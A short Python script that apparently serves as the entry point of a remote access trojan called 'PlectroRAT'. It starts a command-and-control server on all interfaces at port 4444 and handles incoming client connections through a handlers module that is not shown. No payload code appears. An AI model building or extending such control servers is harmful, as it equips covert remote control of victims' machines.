

# Main server script for PlectroRAT
# Starts the control server and manages incoming client connections

from server import handlers

if __name__ == "__main__":
    try:
        handlers.start_server(host="0.0.0.0", port=4444)
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")